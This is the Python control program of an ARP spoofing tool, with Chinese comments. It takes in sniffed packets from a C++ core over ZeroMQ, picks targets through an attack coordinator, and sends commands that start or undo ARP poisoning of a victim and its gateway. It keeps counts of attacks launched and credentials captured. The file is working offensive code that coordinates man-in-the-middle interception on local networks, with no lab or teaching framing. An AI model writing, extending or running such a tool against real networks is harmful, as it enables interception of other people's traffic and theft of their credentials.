#!/usr/bin/env python3
"""
ARP Spoofer Python Supervisor v2.0
===================================
职责：
1. 从C++核心接收网络数据包
2. 分析数据包并做出攻击决策
3. 管理目标状态（TTL缓存）
4. 向C++核心下发攻击指令
5. 提供Web API和监控接口
"""

import zmq
import json
import time
import threading
import logging
import argparse
import signal
import sys
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import Optional, Dict, Set
from datetime import datetime, timedelta

from state_cache import StateCache
from packet_analyzer import PacketAnalyzer
from attack_coordinator import AttackCoordinator
from web_api import WebAPI
from config import Config

class PythonSupervisor:
    """Python监督者主类"""
    
    def __init__(self, config: Config):
        self.config = config
        self.running = False
        
        # ZMQ上下文和套接字
        self.context = zmq.Context()
        self.packet_receiver = None
        self.command_sender = None
        
        # 核心组件
        self.state_cache = StateCache()
        self.packet_analyzer = PacketAnalyzer(config)
        self.attack_coordinator = AttackCoordinator(config, self.state_cache)
        self.web_api = WebAPI(self.state_cache, config)
        
        # ★【新增】★ 心跳机制
        self.last_ping_time = time.time()
        self.heartbeat_thread = None
        self.heartbeat_running = False
        
        # 线程池
        self.thread_pool = ThreadPoolExecutor(
            max_workers=config.max_worker_threads,
            thread_name_prefix="PacketWorker"
        )
        
        # 统计信息
        self.stats = {
            'start_time': time.time(),
            'packets_received': 0,
            'packets_processed': 0,
            'commands_sent': 0,
            'attacks_launched': 0,
            'credentials_captured': 0
        }
        
        # 设置日志
        self._setup_logging()
        
    def _setup_logging(self):
        """设置日志系统"""
        logging.basicConfig(
            level=getattr(logging, self.config.log_level.upper()),
            format='[%(asctime)s] [%(threadName)-20s] [%(levelname)-8s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S',
            handlers=[
                logging.FileHandler(self.config.log_file, mode='a'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        """初始化监督者"""
        try:
            self.logger.info("Initializing Python Supervisor...")
            
            # 初始化ZMQ套接字
            if not self._init_zmq():
                return False
                
            # 初始化各个组件
            if not self.attack_coordinator.initialize(self._send_command):
                self.logger.error("Failed to initialize attack coordinator")
                return False
                
            # 启动Web API（如果启用）
            if self.config.enable_web_api:
                self.web_api.start(self.config.web_api_port)
                
            self.logger.info("Python Supervisor initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize supervisor: {e}")
            return False
            
    def _init_zmq(self) -> bool:
        """初始化ZMQ通信"""
        try:
            # 接收数据包的套接字（PULL模式）
            self.packet_receiver = self.context.socket(zmq.PULL)
            self.packet_receiver.bind(self.config.packet_ipc_address)
            self.packet_receiver.setsockopt(zmq.RCVTIMEO, 1000)  # 1秒超时
            
            # 发送命令的套接字（PUSH模式）
            self.command_sender = self.context.socket(zmq.PUSH)
            self.command_sender.bind(self.config.command_ipc_address)
            self.command_sender.setsockopt(zmq.SNDTIMEO, 1000)  # 1秒超时
            
            self.logger.info(f"ZMQ sockets initialized:")
            self.logger.info(f"  - Packet receiver: {self.config.packet_ipc_address}")
            self.logger.info(f"  - Command sender: {self.config.command_ipc_address}")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to initialize ZMQ: {e}")
            return False
            
    def run(self):
        """运行主循环"""
        self.running = True
        self.logger.info("Starting main supervisor loop...")
        
        # ★【新增】★ 启动心跳机制
        self.start_heartbeat()
        
        try:
            while self.running:
                try:
                    # 接收数据包（二进制数据）
                    raw_data = self.packet_receiver.recv(zmq.NOBLOCK)
                    self.stats['packets_received'] += 1
                    
                    # 尝试解码为字符串
                    try:
                        packet_data = raw_data.decode('utf-8')
                    except UnicodeDecodeError as ude:
                        # 如果不是UTF-8，尝试替换无效字符
                        packet_data = raw_data.decode('utf-8', errors='replace')
                        self.logger.debug(f"Received data with encoding issues, replaced invalid chars")
                    
                    # 验证是否为有效JSON
                    try:
                        packet_info = json.loads(packet_data)
                        
                        # ★【新增】★ 检查是否为心跳PING
                        if packet_info.get('type') == 'PING':
                            self._handle_ping(packet_info)
                            continue
                            
                    except json.JSONDecodeError:
                        self.logger.warning(f"Received invalid JSON data, skipping")
                        continue
                    
                    # 提交给线程池处理
                    self.thread_pool.submit(self._process_packet, packet_data)
                    
                except zmq.Again:
                    # 没有数据包，短暂休眠
                    time.sleep(0.001)
                    continue
                    
                except Exception as e:
                    self.logger.error(f"Error in main loop: {e}")
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            self.logger.info("Received interrupt signal")
        finally:
            self._shutdown()
            
    def _process_packet(self, packet_data: str):
        """处理单个数据包"""
        try:
            # 解析数据包
            packet_info = json.loads(packet_data)
            self.stats['packets_processed'] += 1
            
            # 分析数据包
            analysis_result = self.packet_analyzer.analyze(packet_info)
            
            if analysis_result:
                # 根据分析结果做出决策
                decision = self.attack_coordinator.make_decision(analysis_result)
                
                if decision:
                    self._execute_decision(decision)
                    
        except Exception as e:
            self.logger.error(f"Error processing packet: {e}")
            
    def _execute_decision(self, decision):
        """执行攻击决策"""
        try:
            if decision.action == 'attack':
                self.logger.info(f"Launching attack on {decision.target_ip}")
                self.stats['attacks_launched'] += 1
                
                # 发送攻击命令给C++核心
                command = {
                    'type': 'START_SPOOF',
                    'target_ip': decision.target_ip,
                    'gateway_ip': decision.gateway_ip,
                    'target_mac': decision.target_mac,
                    'gateway_mac': decision.gateway_mac,
                    'duration': decision.duration
                }
                
                self._send_command(command)
                
            elif decision.action == 'restore':
                self.logger.info(f"Restoring ARP for {decision.target_ip}")
                
                command = {
                    'type': 'RESTORE_ARP',
                    'target_ip': decision.target_ip,
                    'gateway_ip': decision.gateway_ip,
                    'target_mac': decision.target_mac,
                    'gateway_mac': decision.gateway_mac
                }
                
                self._send_command(command)
                
        except Exception as e:
            self.logger.error(f"Error executing decision: {e}")
            
    def _send_command(self, command: dict):
        """发送命令给C++核心"""
        try:
            command_json = json.dumps(command)
            self.command_sender.send_string(command_json, zmq.NOBLOCK)
            self.stats['commands_sent'] += 1
            
        except zmq.Again:
            self.logger.warning("Command send timeout")
        except Exception as e:
            self.logger.error(f"Error sending command: {e}")
            
    # ★【新增】★ 心跳机制方法
    def start_heartbeat(self):
        """启动心跳监听线程"""
        if self.heartbeat_running:
            return
            
        self.heartbeat_running = True
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()
        self.logger.info("Heartbeat mechanism started")
    
    def stop_heartbeat(self):
        """停止心跳机制"""
        self.heartbeat_running = False
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            self.heartbeat_thread.join(timeout=1.0)
        self.logger.info("Heartbeat mechanism stopped")
    
    def _heartbeat_loop(self):
        """心跳监听循环"""
        while self.heartbeat_running and self.running:
            try:
                # 检查是否收到PING，如果是则回复PONG
                current_time = time.time()
                
                # 每5秒检查一次连接状态
                if current_time - self.last_ping_time > 20:  # 20秒没收到ping
                    self.logger.warning("⚠️  No heartbeat from C++ core for 20+ seconds")
                
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(f"Heartbeat loop error: {e}")
                time.sleep(1)
    
    def _handle_ping(self, ping_data):
        """处理心跳PING并回复PONG"""
        try:
            self.last_ping_time = time.time()
            
            # 构造PONG响应
            pong_command = {
                'type': 'PONG',
                'timestamp': int(time.time() * 1000),  # 毫秒时间戳
                'status': 'healthy'
            }
            
            # 发送PONG
            self._send_command(pong_command)
            
        except Exception as e:
            self.logger.error(f"Failed to handle ping: {e}")
            
    def _shutdown(self):
        """清理资源"""
        self.logger.info("Shutting down supervisor...")
        self.running = False
        
        # 停止线程池
        if self.thread_pool:
            self.thread_pool.shutdown(wait=True, timeout=5.0)
            
        # 停止Web API
        if self.config.enable_web_api:
            self.web_api.stop()
            
        # 关闭ZMQ套接字
        if self.packet_receiver:
            self.packet_receiver.close()
        if self.command_sender:
            self.command_sender.close()
            
        # 销毁ZMQ上下文
        self.context.term()
        
        # 打印统计信息
        self._print_final_stats()
        
    def _print_final_stats(self):
        """打印最终统计信息"""
        runtime = time.time() - self.stats['start_time']
        
        self.logger.info("=" * 80)
        self.logger.info("🎯 Python Supervisor Final Report")
        self.logger.info("=" * 80)
        self.logger.info(f"Runtime: {runtime:.2f} seconds")
        self.logger.info(f"Packets received: {self.stats['packets_received']}")
        self.logger.info(f"Packets processed: {self.stats['packets_processed']}")
        self.logger.info(f"Commands sent: {self.stats['commands_sent']}")
        self.logger.info(f"Attacks launched: {self.stats['attacks_launched']}")
        self.logger.info(f"Credentials captured: {self.stats['credentials_captured']}")
        
        if runtime > 0:
            pps = self.stats['packets_processed'] / runtime
            self.logger.info(f"Processing rate: {pps:.2f} packets/second")
            
        # 缓存统计
        cache_stats = self.state_cache.get_statistics()
        self.logger.info(f"Cache entries: {cache_stats['total_entries']}")
        self.logger.info(f"Cache hit rate: {cache_stats['hit_rate']:.2f}%")
        
        self.logger.info("=" * 80)

def parse_arguments():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(description="ARP Spoofer Python Supervisor")
    parser.add_argument('-c', '--config', default='config.yaml',
                       help='Configuration file path')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO', help='Log level')
    parser.add_argument('--web-api', action='store_true',
                       help='Enable web API interface')
    parser.add_argument('--web-port', type=int, default=8080,
                       help='Web API port')
    
    return parser.parse_args()

def signal_handler(signum, frame):
    """信号处理器"""
    print(f"\nReceived signal {signum}, shutting down...")
    sys.exit(0)

def main():
    """主函数"""
    # 解析命令行参数
    args = parse_arguments()
    
    # 设置信号处理
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        # 加载配置
        config = Config.load_from_file(args.config)
        
        # 命令行参数覆盖配置文件
        if args.log_level:
            config.log_level = args.log_level
        if args.web_api:
            config.enable_web_api = True
        if args.web_port:
            config.web_api_port = args.web_port
            
        # 创建并运行监督者
        supervisor = PythonSupervisor(config)
        
        if supervisor.initialize():
            supervisor.run()
        else:
            print("Failed to initialize supervisor")
            sys.exit(1)
            
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
